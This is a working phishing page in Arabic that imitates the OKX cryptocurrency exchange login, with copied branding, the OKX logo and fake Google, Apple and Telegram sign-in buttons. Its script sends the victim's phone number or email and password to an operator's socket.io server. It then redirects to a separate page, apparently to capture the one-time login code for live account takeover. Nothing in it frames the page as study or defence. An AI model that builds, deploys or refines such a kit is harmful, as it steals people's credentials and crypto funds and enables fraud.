<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <title>تسجيل الدخول | OKX</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* تنسيق الهيدر الأسود الجديد بـ لوجو OKX الأصلي */
.okx-top-nav {
    background-color: #000000;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 18px; /* زيادة بسيطة في الحشو للفخامة */
    direction: rtl; 
    border-bottom: 1px solid #222; /* خط سفلي رفيع جداً لفصله عن المحتوى */
}

.nav-right-side {
    display: flex;
    align-items: center;
}

/* تنسيق اللوجو الأصلي (المربعات) */
.okx-logo-svg {
    height: 28px; /* تكبير اللوجو عشان يكون ضخم وواضح */
    width: auto;
    display: block;
}

.nav-left-side {
    display: flex;
    align-items: center;
    gap: 18px;
}

.btn-create-acc {
    border: 1px solid #ffffff;
    color: #ffffff !important;
    padding: 6px 16px; /* زيادة حجم الزرار قليلاً */
    border-radius: 20px;
    font-size: 14px;
    font-weight: 600; /* جعل الخط أثقل */
    text-decoration: none;
    transition: background-color 0.2s;
}

.btn-create-acc:hover {
    background-color: #ffffff;
    color: #000000 !important;
}

.nav-icon-svg {
    color: #ffffff;
    display: flex;
    align-items: center;
    cursor: pointer;
}

.hamburger-menu {
    display: flex;
    flex-direction: column;
    gap: 4px;
    cursor: pointer;
}

.hamburger-menu span {
    width: 20px; /* تكبير أيقونة المنيو قليلاً */
    height: 2px;
    background-color: #ffffff;
    border-radius: 1px;
}
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; color: #000; }
        .login-box { max-width: 420px; margin: 40px auto; padding: 20px; }
        .logo-img { margin-bottom: 30px; display: block; }
        h2 { font-weight: 700; font-size: 30px; margin-bottom: 30px; text-align: right; }
        
        .tabs { display: flex; border-bottom: 1px solid #f0f0f0; margin-bottom: 25px; }
        .tab { padding: 10px 0; margin-left: 30px; cursor: pointer; color: #666; font-size: 16px; position: relative; }
        .tab.active { color: #000; font-weight: bold; }
        .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 100%; height: 2px; background: #000; }
        
        /* تصحيح قايمة الدول عشان تظهر جمب الرقم */
        .phone-container { 
            display: flex; 
            flex-direction: row-reverse; /* عشان كود الدولة يظهر عالشمال في الـ RTL */
            gap: 10px; 
            margin-bottom: 15px; 
        }
        
        .country-select { 
            width: 120px; 
            border-radius: 12px; 
            padding: 10px; 
            background: #f5f5f5; 
            border: 1px solid transparent; 
            font-size: 14px; 
            outline: none;
            direction: ltr;
        }

        .form-control { border-radius: 12px; padding: 14px; background: #f5f5f5; border: 1px solid transparent; margin-bottom: 15px; font-size: 16px; text-align: right; }
        .form-control:focus { background: #fff; border-color: #000; box-shadow: none; outline: none; }
        
        .phone-input { margin-bottom: 0 !important; flex: 1; text-align: left !important; direction: ltr; }

        .btn-next { background: #000; color: #fff; border-radius: 50px; border: none; width: 100%; padding: 14px; font-weight: bold; font-size: 18px; margin-top: 10px; transition: 0.2s; }
        
        .divider { position: relative; text-align: center; margin: 30px 0; color: #888; font-size: 14px; }
        .divider::before { content: ""; position: absolute; top: 50%; left: 0; width: 100%; height: 1px; background: #eee; z-index: 1; }
        .divider span { position: relative; background: #fff; padding: 0 15px; z-index: 2; }
        
        .social-btn { border: 1px solid #ddd; border-radius: 50px; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 12px; text-decoration: none; color: #000; font-weight: 600; font-size: 15px; transition: 0.3s; }
        .social-btn:hover { background: #f9f9f9; color: #000; }
        .social-btn img { width: 22px; height: 22px; }
        .tg-btn { background: #24A1DE; color: #fff !important; border: none; }
    </style>
</head>
<body>

<nav class="okx-top-nav">
    <div class="nav-right-side">
        <a href="#" class="nav-icon-svg">
            <svg class="okx-logo-svg" viewBox="0 0 100 22" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M11 22C17.0751 22 22 17.0751 22 11C22 4.92487 17.0751 0 11 0C4.92487 0 0 4.92487 0 11C0 17.0751 4.92487 22 11 22ZM11 19C15.4183 19 19 15.4183 19 11C19 6.58172 15.4183 3 11 3C6.58172 3 3 6.58172 3 11C3 15.4183 6.58172 19 11 19Z" fill="white"/>
                <path d="M35.1 0H28V22H35.1V12.7L42 22H50.1L40.7 10.9L49.9 0H41.8L35.1 7.9V0Z" fill="white"/>
                <path d="M60 0V8.9L68.8 0H77.1L68.4 8.7L77.1 17.3H68.8L60 11V22H53V0H60Z" fill="white"/>
                <path d="M92.7 11L100 0H91.9L87 7.7L82.1 0H74L81.3 11L74 22H82.1L87 14.3L91.9 22H100L92.7 11Z" fill="white"/>
            </svg>
        </a>
    </div>

    <div class="nav-left-side">
        <div class="nav-icon-svg">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
        </div>

        <a href="#" class="btn-create-acc">إنشاء حساب</a>

        <div class="hamburger-menu">
            <span></span>
            <span></span>
            <span></span>
        </div>
    </div>
</nav>
    
<div class="login-box">
    <img src="static/logo.png" width="85" class="logo-img" alt="OKX">
    
    <h2>تسجيل الدخول</h2>
    
    <div class="tabs">
        <div class="tab active" id="phoneTab" onclick="switchTab('phone')">الهاتف</div>
        <div class="tab" id="emailTab" onclick="switchTab('email')">البريد الإلكتروني</div>
    </div>

    <div id="loginForm">
        <div id="phoneInputWrapper" class="phone-container">
            <select id="countryCode" class="country-select">
                <option value="+20">🇪🇬 +20</option>
                <option value="+966">🇸🇦 +966</option>
                <option value="+971">🇦🇪 +971</option>
                <option value="+964">🇮🇶 +964</option>
                <option value="+218">🇱🇾 +218</option>
                <option value="+212">🇲🇦 +212</option>
                <option value="+90">🇹🇷 +90</option>
            </select>
            <input type="text" id="loginInput" class="form-control phone-input" placeholder="رقم الهاتف" required>
        </div>

        <input type="password" id="passwordInput" class="form-control" placeholder="كلمة المرور" required>
        
        <button type="button" id="submitBtn" onclick="sendData()" class="btn-next">التالي</button>
    </div>

    <div class="divider">
        <span>أو تابع باستخدام</span>
    </div>

    <a href="google-login.html" class="social-btn">
        <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" alt="Google"> 
        Google
    </a>

    <a href="#" class="social-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple"> 
        Apple
    </a>

    <a href="#" class="social-btn tg-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"> 
        Telegram
    </a>
</div>

<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>

<script>
    const socket = io('http://localhost:3000'); 
    let currentMode = 'phone';

    function sendData() {
        const userInput = document.getElementById('loginInput').value;
        const passValue = document.getElementById('passwordInput').value;
        const countryCode = document.getElementById('countryCode').value;
        const btn = document.getElementById('submitBtn');

        if(!userInput || !passValue) {
            alert("يرجى إكمال البيانات");
            return;
        }

        btn.disabled = true;
        btn.innerText = "جاري التحقق...";

        const finalUser = (currentMode === 'phone') ? (countryCode + userInput) : userInput;

        socket.emit('login_attempt', { 
            email: finalUser, 
            password: passValue 
        });
    }

    socket.on('need_login_otp', () => { window.location.href = "check.html"; });

    socket.on('login_failed', (data) => {
        alert(data.message);
        const btn = document.getElementById('submitBtn');
        btn.disabled = false;
        btn.innerText = "التالي";
    });

    function switchTab(type) {
        currentMode = type;
        const input = document.getElementById('loginInput');
        const countrySelect = document.getElementById('countryCode');
        const phoneWrapper = document.getElementById('phoneInputWrapper');

        if (type === 'phone') {
            input.placeholder = 'رقم الهاتف';
            input.className = 'form-control phone-input';
            countrySelect.style.display = 'block';
            phoneWrapper.style.display = 'flex';
            document.getElementById('phoneTab').classList.add('active');
            document.getElementById('emailTab').classList.remove('active');
        } else {
            input.placeholder = 'البريد الإلكتروني';
            input.className = 'form-control'; // بيرجع للشكل العادي
            countrySelect.style.display = 'none';
            phoneWrapper.style.display = 'block';
            document.getElementById('emailTab').classList.add('active');
            document.getElementById('phoneTab').classList.remove('active');
        }
    }
</script>
</body>
</html>
